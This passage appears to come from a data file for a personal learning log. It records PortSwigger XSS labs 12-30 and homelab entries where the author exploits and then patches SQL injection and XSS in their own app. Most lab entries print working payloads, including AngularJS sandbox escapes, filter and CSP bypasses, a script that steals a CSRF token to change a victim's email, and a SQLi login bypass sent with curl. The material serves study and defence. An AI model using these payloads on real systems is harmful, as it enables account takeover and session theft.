      'Last XSS session. These are labelled expert, but most were quicker than the practitioner filter-evasion labs from the last couple of days - several came down to a single crafted URL.',
      'The AngularJS ones (25 and 26) are sandbox escapes: Angular used to sandbox template expressions, and these labs use the known bypasses for specific versions. Did them as code-alongs, since the payloads are version-specific artefacts rather than something to reason out from scratch.',
      'Lab 29 ate the time. It is a dangling-markup attack under a strict CSP: no script execution, so instead you inject an unclosed tag that captures the rest of the page into an attribute that gets sent to an attacker server. I got the email field to update to the right value, followed the community notes and the official solution, and the lab still would not register as complete. Left it unsolved. Everything else in the path is done.',
      'That closes XSS, the biggest topic on the list, and it has been most of two weeks. Next is Authentication.',
    ],
    labs: [
      {
        title:
          'Lab 25: Reflected XSS with AngularJS sandbox escape without strings',
        notes: [
          'First expert-level lab, expected a big step up.',
          "It was not - the whole thing is one URL. The payload uses Angular's orderBy filter and String.fromCharCode to build the alert call with no string literals, since string literals are what the sandbox blocks.",
          'Manipulating the search param directly was enough, no exploit server needed.',
        ],
        solution:
          'https://LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1',
        status: 'completed',
      },
      {
        title: 'Lab 26: Reflected XSS with AngularJS sandbox escape and CSP',
        notes: [
          'Same class as 25 but with a CSP in place, so the payload has to come via the exploit server.',
          'The Angular payload uses ng-focus and the orderBy filter to reach alert(document.cookie); the #x fragment focuses the injected input on load to trigger ng-focus.',
          'Delivered as a script that sets location to the crafted lab URL.',
        ],
        solution:
          "<script>\nlocation='https://LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';\n</script>\n\nDelivered from the exploit server.",
        status: 'completed',
      },
      {
        title:
          'Lab 27: Reflected XSS with event handlers and href attributes blocked',
        notes: [
          'The search filter blocks event handlers and href, so onerror / onclick / javascript: href are all out.',
          'What is allowed: svg, a, animate, and the text element. The move is an svg a with an animate that sets the anchor href to a javascript: URL, plus a text element for the victim to click.',
          'First attempt did not work. Went back through it: attributename needed to be attributeName (SVG is case-sensitive), and the text element needed real x and y coordinates to be visible and clickable.',
          'Fixed the casing and coordinates and the "Click me" text fired the alert.',
        ],
        solution:
          'LAB-ID.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>\n\n(URL-encoded in the search param.)',
        status: 'completed',
        screenshots: ['Burp/Lab27XSS.webp'],
      },
      {
        title:
          'Lab 28: Reflected XSS in a JavaScript URL with some characters blocked',
        notes: [
          'The value is reflected into a javascript: URL with several characters blocked, so the payload has to avoid them.',
          'Attacked the postId param directly. The payload closes the surrounding context and uses an arrow function plus throw / onerror to reach alert without the blocked characters, then repairs the trailing syntax with toString and window+empty-string.',
        ],
        solution:
          'post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27',
        status: 'completed',
      },
      {
        title:
          'Lab 29: Reflected XSS protected by very strict CSP, with dangling markup attack',
        notes: [
          'Strict CSP means no script execution at all. The attack is dangling markup: inject an unclosed tag whose attribute swallows the rest of the markup up to the next matching quote, carrying a sensitive value off to an attacker URL.',
          'Injecting normal scripts into the email change does nothing, but appending markup to an email value and submitting is accepted - test@test.com"><img src= onerror=alert(1)> gets stored, and the page looks vulnerable even though nothing executes.',
          'Tried delivering it via my-account?email=... directly, and via the exploit server with a formaction button that posts to the exploit server on click.',
          "The email field updates to the injected value every time, but the lab never registers as solved. Worked through the community notes and PortSwigger's own solution and got the same result - email changes, lab stays incomplete.",
          'Leaving this one unsolved. Possibly a lab-state or delivery-timing issue on my setup rather than the payload.',
        ],
        solution:
          'Not solved. Dangling-markup payload updates the target email as expected, but the lab does not complete, including with the official solution. Revisit later.',
        status: 'blocked',
      },
      {
        title: 'Lab 30: Reflected XSS protected by CSP, with CSP bypass',
        notes: [
          'Final lab. The CSP is built from a request parameter, which means it can be tampered with.',
          "Added a second parameter that injects script-src-elem 'unsafe-inline' into the policy, re-permitting inline script, then put a normal script alert(1) in the search.",
        ],
        solution:
          "?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'\n\n(URL-encoded.)",
        status: 'completed',
      },
    ],
    tools: ['Burp Suite', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'reflected XSS',
      'AngularJS',
      'sandbox escape',
      'CSP bypass',
      'dangling markup',
      'SVG',
      'exploit server',
    ],
    links: [
      {
        label: 'Cross-site scripting (XSS)',
        url: 'https://portswigger.net/web-security/cross-site-scripting',
      },
    ],
  },
  {
    id: 'portswigger-xss-labs-21-24',
    date: '2026-09-07',
    category: 'PortSwigger Labs',
    title:
      'Cross-Site Scripting (XSS) labs 21-24 (template literal, cookie/password theft, CSRF via XSS)',
    workedOn: [
      'Near the end of the XSS path, Labs 21 to 24 - moving from injection mechanics into what XSS is actually for',
      'Lab 21: reflected XSS into a template literal, triggered with ${} instead of a tag or quote breakout',
      'Labs 22-23: cookie theft and password capture - both built around Burp Collaborator (Pro). Skipped 22; attempted the Collaborator-free version of 23 and could not get it to complete. Both parked for a Burp Pro trial',
      "Lab 24: using XSS to run a CSRF attack - reading the victim's CSRF token and changing their email. Completed",
    ],
    body: [
      'These four are the turn from "can I get an alert to fire" to "what does an attacker do with that". Lab 21 is the last of the pure injection-mechanics labs; 22 to 24 are exfiltration and account takeover.',
      'The Pro wall is real here. Labs 22 and 23 are built around Burp Collaborator for catching stolen data out of band, and that is Professional-only. 23 has a documented Collaborator-free method that drops the data into a second blog comment, but I could not get it to complete even after fixing an obvious bug in the code-along script. Parking both until I can run a Burp Pro trial rather than pretending they are done.',
      "Lab 24 did work, and it is the one that clicked conceptually. The injected script silently GETs /my-account, pulls the CSRF token out of the response with a regex, then POSTs to /my-account/change-email with that token. It is same-origin, so the token is readable and the request is trusted. XSS bypasses CSRF protection entirely because the malicious request now comes from the site's own page.",
    ],
    labs: [
      {
        title:
          'Lab 21: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped',
        notes: [
          "Searched p3p and checked the DOM. It shows up twice - once in the search message and once in a script, inside a template literal: var message = `0 search results for 'p3p'`.",
          'Every breakout character is Unicode-escaped: angle brackets, both quote types, backslash, backtick. So no closing the string and no opening a tag.',
          'A template literal evaluates ${ } as JavaScript, and the braces are not escaped. Searching ${alert(1)} runs it directly.',
        ],
        solution: '${alert(1)}',
        status: 'completed',
      },
      {
        title: 'Lab 22: Exploiting cross-site scripting to steal cookies',
        notes: [
          "The goal is a real attack: stored XSS in the blog comments to exfiltrate another user's session cookie and reuse it.",
          'The exfiltration step sends the cookie to an attacker-controlled endpoint, which the lab expects to be Burp Collaborator - a Professional feature.',
          'No Collaborator-free path documented for this one, so skipped.',
        ],
        solution:
          'Not attempted - requires Burp Suite Professional (Collaborator/OAST).',
        status: 'blocked',
      },
      {
        title: 'Lab 23: Exploiting cross-site scripting to capture passwords',
        notes: [
          'Same idea as 22 but capturing an auto-filled username and password rather than a cookie.',
          'PortSwigger documents a Collaborator-free version: inject a script that reads the credential fields and posts them back as a new blog comment, so the data lands somewhere I can read without an external listener.',
          'Worked through the code-along - a script that grabs the csrf token and the username/password fields, builds a FormData, and fetches POST /post/comment with them.',
          'Could not get it to fire. Retraced it step by step and asked Claude for a tip, still nothing.',
          'Spotted that the code-along script calls document.getElementByName, which is not a real DOM method - it is document.getElementsByName (plural). Fixed that and re-ran it, and the lab still would not complete. Something else is off, either in my payload or the lab state.',
          'Parking this one alongside Lab 22. Both are worth coming back to on a Burp Pro trial, where the intended Collaborator-based solution removes the moving parts.',
        ],
        solution:
          'Not solved. Attempted the Collaborator-free comment-drop method as a code-along, including after fixing document.getElementByName to getElementsByName; the lab did not complete. Revisit with Burp Collaborator.',
        status: 'blocked',
      },
      {
        title: 'Lab 24: Exploiting XSS to bypass CSRF defenses',
        notes: [
          'XSS used to carry out a CSRF attack: submit a state-changing request as the victim, from the page they already trust.',
          'Back on the blog post, using a script tag in a comment.',
          'The script GETs /my-account, pulls the CSRF token out of the response with a regex on name="csrf" value="(\\w+)", then POSTs to /my-account/change-email with that token and an attacker-controlled email.',
          'Ran it as a code-along. It submitted and completed the lab. Every user who views the page now hands their email change to the address I set, and from there the attacker can trigger a password reset.',
          'The point: CSRF tokens do not help when the attacker has XSS. A same-origin script can read the token and send the request itself.',
        ],
        solution:
          "<script>\nvar req = new XMLHttpRequest();\nreq.onload = handleResponse;\nreq.open('get','/my-account',true);\nreq.send();\nfunction handleResponse() {\n    var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1];\n    var changeReq = new XMLHttpRequest();\n    changeReq.open('post', '/my-account/change-email', true);\n    changeReq.send('csrf='+token+'&email=test@test.com')\n};\n</script>",
        status: 'completed',
      },
    ],
    tools: ['Burp Suite', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'reflected XSS',
      'stored XSS',
      'template literals',
      'cookie theft',
      'CSRF',
      'exploit server',
      'Burp Collaborator',
    ],
    links: [
      {
        label: 'Cross-site scripting (XSS)',
        url: 'https://portswigger.net/web-security/cross-site-scripting',
      },
    ],
  },
  {
    id: 'portswigger-xss-labs-15-20',
    date: '2026-09-06',
    category: 'PortSwigger Labs',
    title:
      'Cross-Site Scripting (XSS) labs 15-20 (custom tags, SVG, canonical link, JS string escaping, stored onclick)',
    workedOn: [
      'Kept going on the XSS path, Labs 15 to 20 - all filter and encoding evasion',
      'Labs 15-16: filters that block every standard tag - a custom element with onfocus, and the SVG animatetransform / onbegin combo, both found with Intruder',
      'Lab 17: reflected XSS into a canonical link tag with no visible input, made clickable with accesskey',
      'Labs 18-19: reflected XSS into a JavaScript string with the quote and backslash escaped - breaking out with </script>, then with a trailing comment',
      'Lab 20: the stored version, using the comment website field and HTML entities to get past blocked characters',
    ],
    body: [
      'Second XSS session today. These six are all filter evasion: the injection point is obvious, the work is finding what the WAF or the encoding actually lets through.',
      'Intruder came out again for 15 and 16, same method as Lab 14 - fire the cheatsheet at the filter and watch for 200s, first for tags then for event handlers. Slow on the free version but it is the only way through when the allowed set is small.',
      'Lab 17 taught me something new. There is no search box - the value is reflected into a <link rel="canonical"> tag in the head that the user never sees. accesskey binds the injected onclick to a keypress, so the exploit works by getting the victim to press a key rather than click a visible element.',
    ],
    labs: [
      {
        title:
          'Lab 15: Reflected XSS into HTML context with all tags blocked except custom ones',
        notes: [
          'The WAF blocks every standard tag - anything in the search comes back as a JSON error saying the tag is not allowed.',
          'A custom element gets through. A custom tag with an alert works when loaded directly, but that is not the lab - it wants the alert to fire for a victim via the exploit server.',
          'The payload shape: a custom tag with onfocus=alert(document.cookie), plus id and tabindex so the element is focusable and has a fragment target.',
          'Sent it through the search and it was not blocked.',
          'From the exploit server, a script that sets location to the lab search URL with the payload, ending in #x so the browser focuses the element with id x on load and fires onfocus.',
        ],
        solution:
          '<script>\nlocation = "https://LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x";\n</script>\n\nDelivered from the exploit server.',
        status: 'completed',
        screenshots: ['Burp/Lab15XSS.webp'],
      },
      {
        title: 'Lab 16: Reflected XSS with some SVG markup allowed',
        notes: [
          'Standard tags blocked again. Back to Intruder with the tag list.',
          'svg and animatetransform both return 200. animatetransform lives inside svg - note to self.',
          'Then a second Intruder run over event handlers to find one the WAF allows.',
          'onbegin returns 200. animatetransform fires onbegin when its animation starts, so no user interaction is needed.',
        ],
        solution: "<svg><animatetransform onbegin='alert(1)'>",
        status: 'completed',
      },
      {
        title: 'Lab 17: Reflected XSS in canonical link tag',
        notes: [
          'No visible input. The value is reflected into a <link rel="canonical"> tag in the head, which the user never sees.',
          "Attacked the URL directly. Tried ?'onclick=alert(1) - nothing happened, and the DOM showed a trailing quote left over.",
          "Used that trailing quote: ?'onclick='alert(1) closed the attribute cleanly and the onclick listener landed.",
          'The tag is not clickable in any normal way, so the trigger is an access key - accesskey binds the onclick to a keypress.',
        ],
        solution:
          "https://LAB-ID.web-security-academy.net/?'accesskey='x'onclick='alert(1)\n\nVictim presses the access key to fire it.",
        status: 'completed',
        screenshots: ['Burp/Lab17XSS.webp'],
      },
      {
        title:
          'Lab 18: Reflected XSS into a JavaScript string with single quote and backslash escaped',
        notes: [
          "Ran a unique search (p3p) and checked the DOM. It appears three times, including inside a script and an img tag: var searchTerms = 'p3p'; document.write(...).",
          'Tried to break out of the string. Adding my own backslash to escape the escaping just gets more backslashes added - the single quote and backslash are both escaped, exactly what the title says.',
          'Since the string cannot be broken, went for the script element instead: close the current script and open a new one with the alert.',
        ],
        solution: '</script><script>alert(1)</script>',
        status: 'completed',
      },
      {
        title:
          'Lab 19: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped',
        notes: [
          'Angle brackets and double quotes HTML-encoded, single quotes escaped. Checked the DOM and saw the backslashes being added.',
          "Tried \\' + alert() - did not work.",
          "Added the trailing comment: \\' + alert()// - the // swallows the rest of the line so the leftover quote does not break the syntax. That worked.",
        ],
        solution: "\\' + alert()//",
        status: 'completed',
      },
      {
        title:
          'Lab 20: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped',
        notes: [
          'Stored version of the same idea, so back to the comment section. A comment renders the website field as a hyperlink on the commenter name.',
          'Angle brackets, double quotes, single quotes and backslash are all blocked or escaped. HTML entities are not.',
          'Put the payload in the website field so it lands in the onclick of that link: http://foo?&apos;-alert(1)-&apos;. &apos; is the HTML entity for a single quote, which the browser decodes inside the onclick attribute, so -alert(1)- runs when the link is clicked.',
          'First try used a colon instead of the semicolon on &apos; - fixed that and it worked.',
        ],
        solution:
          'http://foo?&apos;-alert(1)-&apos;\n\nSet as the website field on a comment; fires when the name link is clicked.',
        status: 'completed',
      },
    ],
    tools: ['Burp Suite', 'Burp Intruder', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'reflected XSS',
      'stored XSS',
      'WAF bypass',
      'Burp Intruder',
      'SVG',
      'custom elements',
      'HTML entities',
      'exploit server',
    ],
    links: [
      {
        label: 'Cross-site scripting (XSS)',
        url: 'https://portswigger.net/web-security/cross-site-scripting',
      },
    ],
  },
  {
    id: 'portswigger-xss-labs-12-14',
    date: '2026-09-06',
    category: 'PortSwigger Labs',
    title:
      'Cross-Site Scripting (XSS) labs 12-14 (DOM eval sink, stored DOM, tag/attribute brute-forcing)',
    workedOn: [
      'Back on the PortSwigger XSS path after the homelab work, Labs 12 to 14',
      'Lab 12: reflected DOM XSS, breaking out of a string that gets passed to eval()',
      'Lab 13: stored DOM XSS through the blog comment form',
      'Lab 14: reflected XSS with most tags and attributes blocked, using Burp Intruder to brute-force which tag and attribute get through',
    ],
    body: [
      'Switched back to PortSwigger after a couple of days finding and fixing the same bug classes in my own app. These three are all practitioner-level and all on the same blog lab I have been using.',
      'Lab 14 was the first time I have used Burp Intruder properly. On the free version it rate-limits hard, so the tag and attribute brute-forcing is slow, but the method is the point: fire the whole PortSwigger cheatsheet of tags at the filter, watch for the 200s, then repeat for attributes on whichever tag survived.',
      'Two of these came down to eval(). Note to self, which the labs keep reinforcing: never build a string out of user input and hand it to eval().',
    ],
    labs: [
      {
        title: 'Lab 12: Reflected DOM XSS',
        notes: [
          'Searched a unique random word (p3p) in the blog search and checked the DOM. The term shows up in the h1, but there is no inline script putting it there.',
          'Found the JavaScript in the Network tab, not obfuscated. The response shows the whole search handler: it takes the JSON search-results response and runs it through eval() to parse it, so the reflected search term ends up inside a string that eval() executes.',
          'eval() on a string built from user input is the whole vulnerability. The search term sits inside a double-quoted string in that eval call, so the goal is to break out of the string.',
          'Intercepted the search request in Burp and tried search=p3p"-alert(). That did not break out - the original string\'s closing quote was still in the way.',
          'Added a backslash to escape into the string and tried a few variants. Got tripped up by an extra space at one point which broke the payload; removed it and still no alert. The trailing quote from the original string kept the statement from being valid JavaScript.',
          'Per the PortSwigger notes, commented out the rest of the line with // so the leftover " does not throw a syntax error. That made it fire.',
          'Final payload breaks down as: \\" escapes into the string, -alert() runs, } closes the object literal, // comments out the rest of the line.',
        ],
        solution:
          'p3p\\"-alert()}//\n\nFull URL: https://LAB-ID.web-security-academy.net/?search=p3p\\%22-alert()}//',
        status: 'completed',
        screenshots: ['Burp/Lab12XSS.webp'],
      },
      {
        title: 'Lab 13: Stored DOM XSS',
        notes: [
          'Quick recap that stuck: three types of XSS - reflected, stored, and DOM-based. Stored is the one that gets saved server-side and fires later when another user loads it.',
          'Back on the blog, using the comment form as the input. The DOM has a script that takes the comment and inserts it into the page.',
          'Sent plain HTML first - a couple of h1 tags - and checked the DOM. Got <h1>Hello World back with no closing tag, rendered as a heading, so the comment is not being HTML-encoded on the way in.',
          'Tried <h1><h1 onmouseover=alert()">Hello</h1>. It did not fire - I had left the opening double quote off the handler. Fixed the quotes and the onmouseover alert worked on hover, but the lab still would not mark complete.',
          'The lab wants the alert to fire on load, not on an interaction. Switched to an img onerror payload so it fires by itself. Fumbled it a couple of times - missing quote, missing brackets - then landed on the working one. The <> is junk that breaks the surrounding parsing, the img has a bad src so onerror runs alert(1) straight away.',
        ],
        solution: '<><img src=1 onerror=alert(1)>',
        status: 'completed',
      },
      {
        title:
          'Lab 14: Reflected XSS into HTML context with most tags and attributes blocked',
        notes: [
          'The search input is filtered by a WAF. The usual payloads are blocked, but the angle brackets themselves are not, so a tag can still be formed - the filter is on which tags and attributes are allowed through.',
          'First real use of Burp Intruder. Copied the full tag list from the PortSwigger XSS cheatsheet as the payload set and fired it at the search param, watching the status codes. On the free version this is slow because Intruder is throttled.',
          'body came back 200 while the rest were blocked, so <body> gets through the filter.',
          'Set up a second Intruder run against attributes on body: search=<body%20[attr]=1>. Waited that one out too.',
          'onresize survived. body plus onresize means the payload needs something that actually resizes the element, which is where the exploit-server iframe comes in: load the lab in an iframe and change its width onload so the onresize handler on the injected body fires.',
          'Delivered from the exploit server.',
        ],
        solution:
          '<iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width=\'100px\'>\n\nDelivered from the exploit server.',
        status: 'completed',
      },
    ],
    tools: ['Burp Suite', 'Burp Intruder', 'Web Browser', 'Chrome DevTools'],
    tags: [
      'XSS',
      'DOM XSS',
      'reflected XSS',
      'stored XSS',
      'eval',
      'Burp Intruder',
      'WAF bypass',
      'exploit server',
    ],
    links: [
      {
        label: 'Cross-site scripting (XSS)',
        url: 'https://portswigger.net/web-security/cross-site-scripting',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-13-product-search-xss-fix',
    date: '2026-09-05',
    category: 'AppSec Homelab',
    title: 'Exploiting and fixing the product search XSS',
    workedOn: [
      'Tried a manual XSS against the product search input, which the codebase already showed was vulnerable',
      'Confirmed it: <img src=x onerror="alert(document.domain)"> fires an alert showing the page\'s own domain',
      'Fixed it by rendering the query through JSX text interpolation ({submittedQuery}) instead of raw HTML, so React escapes it automatically',
      'Chased a false alarm where search appeared broken after the fix - the dotnet backend was still stopped from earlier, unrelated to the fix itself',
      'Re-tested with a real search term and confirmed the payload no longer executes',
    ],
    body: [
      'Two exploits fixed, one more to try. XSS is the last of the vulnerabilities I already knew was seeded in the app, from having read the codebase.',
      'Ran npm run dev and pointed it at the same product search input from earlier. Tried <img src=x onerror="alert(document.domain)"> in the search box.',
      'It fired. The onerror handler runs as soon as the broken image tries and fails to load, popping an alert with document.domain: localhost. DevTools showed the raw img tag sitting straight in the DOM, unescaped, exactly where the search term gets echoed back.',
      "Tried a couple of variations to see what else I could get out of it beyond the alert box, but nothing more came of it - the input doesn't reach anywhere more interesting than the DOM in this app.",
      'Fixed the display so React renders it as text instead of markup (before/after, below). JSX escapes anything interpolated this way by default, so a string that looks like an img tag comes out on the page as literal characters instead of parsed HTML.',
      'Retested and thought I had broken the search feature entirely - no results were coming back for a normal term either. Turned out I had stopped the dotnet build for the backend earlier in the day and forgotten about it, so nothing was reaching the database. Not related to the fix at all.',
      'Restarted the backend, searched for laptop, and it worked properly - a real result back, and the earlier payload now shows up as plain text instead of executing. Three for three on the seeded vulnerabilities now: the login bypass, the product search SQLi, and this one.',
    ],
    codeSnippets: [
      {
        label: 'Product search result - before (dangerouslySetInnerHTML)',
        code: '<p\n  dangerouslySetInnerHTML={{\n    __html: `You searched for: ${submittedQuery}`,\n  }}\n/>',
      },
      {
        label: 'Product search result - after (JSX text interpolation)',
        code: '<p>You searched for: {submittedQuery}</p>',
      },
    ],
    screenshots: [
      'Homelab/HomeLabXSS1.webp',
      'Homelab/HomeLabXSS2.webp',
      'Homelab/HomeLabXSSFix1.webp',
      'Homelab/HomeLabXSS3.webp',
    ],
    tools: ['React', 'JSX', 'Chrome DevTools'],
    tags: ['AppSec homelab', 'XSS', 'reflected XSS', 'output encoding'],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-12-product-search-sqli-fix',
    date: '2026-09-05',
    category: 'AppSec Homelab',
    title: 'Fixing the ProductsController SQL injection',
    workedOn: [
      'Fixed the SQL injection in the product search endpoint (ProductsController.cs), the other of the two SQLi bugs seeded in the app and the one Semgrep does flag',
      'Used the same fix as the AuthController.cs login bypass: bound the search term with CreateParameter instead of interpolating it into the LIKE clause',
      'Confirmed the fix with curl: a normal search still returns real results, and a query ending in a single quote now returns an empty array instead of breaking out of the query',
    ],
    body: [
      'Straight on to the next exploit fix. This one is the product search endpoint, which is the SQLi Semgrep does flag - the counterpart to the AuthController.cs login bypass from earlier today, which it does not.',
      'The vulnerable code, commented in the repo as A05:2025 - Injection, is the same raw string concatenation pattern as the login query, just a LIKE clause instead of an equality check (before, below).',
      'Fixed it the same way as AuthController.cs: created a parameter instead of interpolating it, binding the value instead of building it into the SQL string (after, below).',
      'Tested with curl -s "http://localhost:5001/api/products/search?query=lap" first, which comes back with the real product as expected - the Laptop Stand. Then curl -s "http://localhost:5001/api/products/search?query=test\'", a query ending in a single quote, which would have broken out of the LIKE clause on the old code. It comes back as an empty array instead, so the fix holds.',
      'Two for two now on the seeded SQLi bugs, the login bypass and the product search, both fixed the same way. Next is checking whether anything else in the app needs the same treatment.',
    ],
    codeSnippets: [
      {
        label: 'ProductsController.cs - before (string interpolation)',
        code: '// VULNERABLE: raw string concatenation into SQL (A05:2025 - Injection)\nvar sql = $"SELECT Id, Name, Description FROM Products WHERE Name LIKE \'%{query}%\'";\n\nusing var connection = _db.Database.GetDbConnection();\nconnection.Open();\nusing var command = connection.CreateCommand();\ncommand.CommandText = sql;\nusing var reader = command.ExecuteReader();',
      },
      {
        label: 'ProductsController.cs - after (parameterized)',
        code: 'var queryParam = command.CreateParameter();\nqueryParam.ParameterName = "@Query";\nqueryParam.Value = $"%{query}%";\ncommand.Parameters.Add(queryParam);\nusing var reader = command.ExecuteReader();',
      },
    ],
    screenshots: [
      'Homelab/SQLiHomeLabProductFix.webp',
      'Homelab/HomeLabProductFix2.webp',
      'Homelab/HomeLabProductFix3.webp',
    ],
    tools: ['.NET / C#', 'curl'],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'parameterized queries',
      'OWASP Top 10',
    ],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-11-login-bypass-fix',
    date: '2026-09-05',
    category: 'AppSec Homelab',
    title: 'Exploiting and fixing a SQL injection login bypass',
    workedOn: [
      'Tried a manual SQL injection against the login endpoint of my own appsec-homelab app, using PortSwigger technique on a codebase I built myself',
      "Confirmed the exploit: administrator' -- as the username with any password logs in as admin",
      'Fixed the vulnerable query in AuthController.cs, first with EF Core parameters via AddWithValue, then properly with CreateParameter after a build error',
      'Committed the fix and watched the pipeline run: Semgrep still does not flag AuthController.cs, matching the false negative documented in Entry 5',
    ],
    body: [
      "Next day in the homelab. Plan was to take what I've been drilling in PortSwigger and turn it on my own app: a manual UNION-based SQL injection against the login endpoint in appsec-homelab.",
      'First, the baseline. curl -i -X POST http://localhost:5001/api/auth/login -H \'Content-Type: application/json\' -d \'{"username":"<a seeded user>","password":"<their real password>"}\'. That is what a normal login looks like.',
      'Then the exploit, and it turned out to be simpler than the UNION attack I went in expecting. Same request, but {"username":"administrator\' --","password":"anything"}. The -- comments out the rest of the WHERE clause, so the password check never runs. Any string in the password field logs in as administrator. Same category of bug I have been practicing on PortSwigger, just the classic auth-bypass shape rather than a UNION extraction.',
      'Finding it is one thing, fixing it in code is the actual point of this repo. The original AuthController.cs built the query by string interpolation - whatever came in on the username and password fields landed straight in the SQL text (before, below).',
      'First fix used command.Parameters.AddWithValue("@Name", request.Username) and the same for the password, binding the values instead of interpolating them. Ran dotnet build and it failed. Rather than guess further, switched approach.',
      'Second attempt built the parameters manually with CreateParameter() instead (after, below). That built cleanly.',
      "Re-ran the same curl exploit against the fixed endpoint and it no longer worked. The username value is now bound as a literal parameter instead of concatenated into the query text, so administrator' -- just gets treated as a username string that does not exist, which is the point of parameterization.",
      "Committed the fix and pushed. The pipeline ran and Semgrep flagged ProductsController.cs's injection like it always does, but still said nothing about AuthController.cs - same false negative as Entry 5, except now it applies to a fixed endpoint instead of a vulnerable one. The tool's blind spot on [FromBody]-bound input cuts both ways: it never caught the bug and it will not confirm the fix either. Manual testing is still the only thing that actually proves either state here.",
      'Onto the next exploit and fix. Same drill on whatever the ProductsController vulnerability turns up.',
    ],
    codeSnippets: [
      {
        label: 'AuthController.cs - before (string interpolation)',
        code: "var sql = $\"SELECT Id, Username FROM Users WHERE Username = '{request.Username}' AND Password = '{request.Password}'\";\n\nusing var connection = _db.Database.GetDbConnection();\nconnection.Open();\nusing var command = connection.CreateCommand();\ncommand.CommandText = sql;\nusing var reader = command.ExecuteReader();",
      },
      {
        label: 'AuthController.cs - after (parameterized)',
        code: 'var sql = "SELECT Id, Username FROM Users WHERE Username = @Name AND Password = @Password";\n\nusing var connection = _db.Database.GetDbConnection();\nconnection.Open();\nusing var command = connection.CreateCommand();\ncommand.CommandText = sql;\nvar nameParam = command.CreateParameter();\nnameParam.ParameterName = "@Name";\nnameParam.Value = request.Username;\ncommand.Parameters.Add(nameParam);\nvar passwordParam = command.CreateParameter();\npasswordParam.ParameterName = "@Password";\npasswordParam.Value = request.Password;\ncommand.Parameters.Add(passwordParam);\nusing var reader = command.ExecuteReader();',
      },
    ],
    screenshots: [
      'Homelab/SQLiHomeLabDay2.webp',
      'Homelab/SQLiHomeLabDay2.1.webp',
      'Homelab/SQLiHomeLabLoginFix.webp',
      'Homelab/SQLiHomeLabGrep.webp',
    ],
    tools: ['.NET / C#', 'curl', 'GitHub Actions', 'Semgrep'],
    tags: [
      'AppSec homelab',
      'SQL injection',
      'authentication bypass',
      'parameterized queries',
    ],
    links: [
      {
        label: 'appsec-homelab repo',
        url: 'https://github.com/charles-goodsir/appsec-homelab',
      },
    ],
  },
  {
    id: 'appsec-homelab-entry-10-zap-remediation-final',
    date: '2026-09-03',
    category: 'AppSec Homelab',
    title: 'ZAP remediation, final round',
    workedOn: [
      'Added the last batch of response headers to frontend/nginx.conf: Cross-Origin-Opener-Policy, Cross-Origin-Resource-Policy, Cross-Origin-Embedder-Policy, and a Permissions-Policy that disables geolocation, camera, and microphone',
      "Added form-action 'self' to the CSP, which cleared the undefined-directive warning from the second scan",
      'Rebuilt the app and ran the third ZAP baseline scan for the final before and after',
      'Called the remediation loop finished: 3 warnings left, all documented trade-offs or informational',
    ],
    body: [
      'Third and last pass at the ZAP findings. The second scan left the three cross-origin headers, the Permissions-Policy header, and a still-weak CSP open, so this round closes those out.',
      'Added to frontend/nginx.conf: Cross-Origin-Opener-Policy: same-origin, Cross-Origin-Resource-Policy: same-origin, Cross-Origin-Embedder-Policy: require-corp, and Permissions-Policy: geolocation=(), camera=(), microphone=(). I left a comment on the COEP line noting that require-corp can break cross-origin loads. It is safe here because everything the app loads is same-origin, but it is not a header to apply blindly on a site that pulls in third-party resources.',
      "For the CSP, adding form-action 'self' cleared the failure-to-define-directive-with-no-fallback warning from round 2.",
      'Then rebuilt and re-ran the same scan: docker compose up -d --build, then docker run -t -v $(pwd):/zap/wrk/:rw zaproxy/zap-stable zap-baseline.py -t http://192.168.88.13:8080 -r zap-report-3.html.',
      'The numbers across the three rounds: round 1 was 8 warnings and 59 passes, round 2 was 5 and 62, round 3 is 3 and 64. The three that are left are all deliberate. The CSP still allows unsafe-inline for styles, which I have kept for a v1 policy and noted in the nginx comments. The other two, storable and cacheable content and the modern-web-application flag, are informational only.',
      'I am calling this the stopping point for the remediation loop. Everything fixable with a header is fixed, and what is left is either informational or a justified trade-off documented in the config itself. Chasing the last three further is diminishing returns for a homelab. The point was to show the fix-and-verify loop works, not to force a zero-warning scan.',
      'Where things stand: SAST, secrets scanning, and DAST are all working, and the DAST side now has three full rounds documented as a clean before and after. The pipeline is proven on findings I found myself, not theoretical ones. Next is the OWASP Top 10 mapping: take the vulns from PortSwigger, manual testing, and this ZAP work and tie each one to its Top 10 category for the writeup. Then back to the PortSwigger XSS labs.',
      'This is the strongest single artifact in the homelab so far: a real three-round fix-and-verify cycle with before and after numbers, not a one-off scan. The Cross-Origin-Embedder-Policy comment is the part worth raising in interviews. Knowing when a security header is risky to apply blindly is a better signal than knowing the headers exist.',
    ],
    screenshots: [
      'Homelab/HomeLab3.webp',
      'Homelab/HomeLab3GhAction.webp',
      'Homelab/HomeLab4.webp',
    ],
    tools: ['OWASP ZAP', 'Docker', 'nginx'],
    tags: [
      'AppSec homelab',
      'DAST',
      'OWASP ZAP',
      'security headers',
      'CSP',
